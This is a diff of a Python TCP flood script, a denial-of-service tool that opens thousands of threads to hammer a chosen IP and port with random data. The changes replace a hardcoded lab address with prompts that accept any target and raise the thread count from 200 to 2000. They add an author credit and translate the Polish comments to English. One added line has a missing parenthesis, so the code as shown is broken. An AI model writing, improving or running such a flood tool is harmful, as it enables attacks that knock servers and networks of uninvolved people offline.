@@ -3,10 +3,13 @@ import threading
 import time
 import random
 import string
+import os
 
-TARGET_IP = '192.168.1.166'   # Zamień na IP serwera/routera w Twoim labie
-TARGET_PORT = 135         # Port TCP do floodowania
-NUM_THREADS = 200
+TARGET_IP = input("TARGET IP: ")
+TARGET_PORT = int(input("OPEN PORT: ")
+os.system("clear")
+print("MADE BY apexvr_ ON TIKTOK")
+NUM_THREADS = 2000
 
 def random_payload(size=1024):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()
@@ -17,12 +20,12 @@ def tcp_flood():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1)
             s.connect((TARGET_IP, TARGET_PORT))
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # wysyłaj od razu
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             while True:
-                s.sendall(random_payload(1024))  # surowe dane TCP
+                s.sendall(random_payload(1024))
         except Exception:
             s.close()
-            time.sleep(0.05)  # króciutki odpoczynek przed kolejną próbą
+            time.sleep(0.05)
 
 threads = []
 for i in range(NUM_THREADS):
@@ -30,10 +33,10 @@ for i in range(NUM_THREADS):
     t.start()
     threads.append(t)
 
-print(f"🚀 TCP flood uruchomiony na {TARGET_IP}:{TARGET_PORT} z {NUM_THREADS} wątkami. Przerwij Ctrl+C.")
+print(f"🚀 TCP flood started at {TARGET_IP}:{TARGET_PORT} with {NUM_THREADS} threads. Stop with Ctrl+C.")
 
 try:
     while True:
         time.sleep(1)
 except KeyboardInterrupt:
-    print("\n✅ Flood zakończony (Ctrl+C)")
+    print("\n✅ Flood ended(Ctrl+C)")
